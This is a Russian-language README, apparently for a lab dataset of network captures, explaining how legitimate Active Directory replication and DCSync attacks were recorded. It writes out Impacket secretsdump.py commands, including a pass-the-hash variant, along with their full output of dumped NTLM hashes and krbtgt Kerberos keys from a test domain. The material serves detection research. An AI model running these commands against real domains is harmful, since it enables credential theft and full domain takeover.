# Описание получения каждого сетевого дампа

--- 

# legitimate_replication.pcapng
Файл был получен используя утилиту repadmin.
### Пример команды: repadmin /syncall /AdeP
Результат выполнения команды:

```python
Синхронизация всех NC, содержащихся в dc01.
Синхронизация раздела: DC=ForestDnsZones,DC=work,DC=local
СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Сейчас выполняется следующая репликация:
    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Следующая репликация успешно завершена:
    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Завершена операция SyncAll.
Команда SyncAll завершена без ошибок.
Синхронизация раздела: DC=DomainDnsZones,DC=work,DC=local
СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Сейчас выполняется следующая репликация:
    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Следующая репликация успешно завершена:
    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Завершена операция SyncAll.
Команда SyncAll завершена без ошибок.
Синхронизация раздела: CN=Schema,CN=Configuration,DC=work,DC=local
СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Сейчас выполняется следующая репликация:
    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Следующая репликация успешно завершена:
    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Завершена операция SyncAll.
Команда SyncAll завершена без ошибок.
Синхронизация раздела: CN=Configuration,DC=work,DC=local
СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Сейчас выполняется следующая репликация:
    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Следующая репликация успешно завершена:
    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Завершена операция SyncAll.
Команда SyncAll завершена без ошибок.
Синхронизация раздела: DC=work,DC=local
СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Сейчас выполняется следующая репликация:
    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Следующая репликация успешно завершена:
    От: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
    Кому: CN=NTDS Settings,CN=DC02,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=work,DC=local
СООБЩЕНИЕ ОБРАТНОГО ВЫЗОВА: Завершена операция SyncAll.
Команда SyncAll завершена без ошибок.
```

### Сетевой трафик:
<img width="1916" height="990" alt="image" src="https://github.com/user-attachments/assets/785370ac-a5c6-49d7-9a86-9f95a4a6ebc7" />


# dcsync_secretsdump_success.pcapng
Файл был получен используя утилиту secretsdump.py. 
### Пример команды: secretsdump.py work.local/svc_replicator:P@ssw0rd@192.168.0.10
Результат выполнения команды:

``` python
┌──(bang㉿kali)-[~]
└─$ secretsdump.py work.local/svc_replicator:P@ssw0rd@192.168.0.10                             
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Администратор:500:aad3b435b51404eeaad3b435b51404ee:f782c89c34b62ccc04dbe747126e1853:::
Гость:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8bcdec75f939ce1637ad4fd2c1a364e:::
Dekstop:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
work.local\ivanov:1109:aad3b435b51404eeaad3b435b51404ee:2f9ab01656490ee845bc1ba8769ae33b:::
work.local\test:1110:aad3b435b51404eeaad3b435b51404ee:2f9ab01656490ee845bc1ba8769ae33b:::
work.local\adm_yury:1112:aad3b435b51404eeaad3b435b51404ee:2f9ab01656490ee845bc1ba8769ae33b:::
svc_replicator:1116:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:7d285cee96188ffea0f18a07d0505acd:::
DESKTOP-IAB210V$:1111:aad3b435b51404eeaad3b435b51404ee:bf52151b6c1ca9856a866ccc1b7b28af:::
UBNUSER$:1113:aad3b435b51404eeaad3b435b51404ee:430424cfc45c87bad8f38da736cd84cf:::
DC02$:1118:aad3b435b51404eeaad3b435b51404ee:0d77a3958d8d5a4d2a1872f182ddd9df:::
```

Без указания дополнительных параметров утилита будет по умолчанию делать репликацию для всех объектов, а не для конкретной например УЗ, как в примере выше:
Можно указать только для одной УЗ, например krbtgt с флагом -debug (необязательный) для более подробного вывода работы утилиты.
### Пример команды: secretsdump.py work.local/svc_replicator:P@ssw0rd@192.168.0.10 -just-dc-user krbtgt -debug 
Результат выполнения команды:

``` python
┌──(bang㉿kali)-[~]
└─$ secretsdump.py work.local/svc_replicator:P@ssw0rd@192.168.0.10 -just-dc-user krbtgt -debug 
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/bang/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Calling DRSCrackNames for krbtgt 
[+] Calling DRSGetNCChanges for {865a27ca-c371-4426-9f58-93d72e9c8033} 
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=work,DC=local
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8bcdec75f939ce1637ad4fd2c1a364e:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Finished processing and printing user's hashes, now printing supplemental information
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:b2f8e371e4e8e76f29efc5d1ebef2e357803f30a99548fa0eaf35120ef17da78
krbtgt:aes128-cts-hmac-sha1-96:484717f9845720c5b22c0d95343d2f9e
krbtgt:des-cbc-md5:f7d00dc1b9f4a219
[*] Cleaning up... 
```

### Сетевой трафик
<img width="1918" height="962" alt="image" src="https://github.com/user-attachments/assets/ae06b2ca-127e-48e5-aef5-2f42ec90c81e" />


# dcsync_secretsdump_fail.pcapng
Файл был получен используя утилиту secretsdump.py. 
### Пример команды: secretsdump.py work.local/ivanov@192.168.0.10 -hashes aad3b435b51404eeaad3b435b51404ee:2f9ab01656490ee845bc1ba8769ae33b -just-dc-user krbtgt -debug
В команде используется УЗ ivanov, которая не имеет прав на репликацию. Используется параметр -hashes, чтобы пройти аутентификацию используя hash УЗ, параметр -just-dc-user позволяет запросить данные только об одной УЗ. 
Результат выполнения команды:

``` python
┌──(bang㉿kali)-[~]
└─$ secretsdump.py work.local/ivanov@192.168.0.10 -hashes aad3b435b51404eeaad3b435b51404ee:2f9ab01656490ee845bc1ba8769ae33b -just-dc-user krbtgt -debug
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/bang/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Calling DRSCrackNames for krbtgt 
[+] Calling DRSGetNCChanges for {865a27ca-c371-4426-9f58-93d72e9c8033} 
Traceback (most recent call last):
  File "/home/bang/.local/bin/secretsdump.py", line 336, in dump
    self.__NTDSHashes.dump()
    ~~~~~~~~~~~~~~~~~~~~~~^^
  File "/home/bang/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/examples/secretsdump.py", line 3368, in dump
    userRecord = self.__remoteOps.DRSGetNCChangesGuid(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
  File "/home/bang/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/examples/secretsdump.py", line 603, in DRSGetNCChangesGuid
    return self._DRSGetNCChanges(userGuid, dsName)
           ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^
  File "/home/bang/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/examples/secretsdump.py", line 662, in _DRSGetNCChanges
    return self.__drsr.request(request)
           ~~~~~~~~~~~~~~~~~~~^^^^^^^^^
  File "/home/bang/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1436, in request
    raise exception
impacket.dcerpc.v5.drsuapi.DCERPCSessionError: DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up... 
```

### Сетевой трафик:
<img width="1914" height="955" alt="image" src="https://github.com/user-attachments/assets/e0511b21-bf99-487f-9cde-67ba81d6bcd2" />





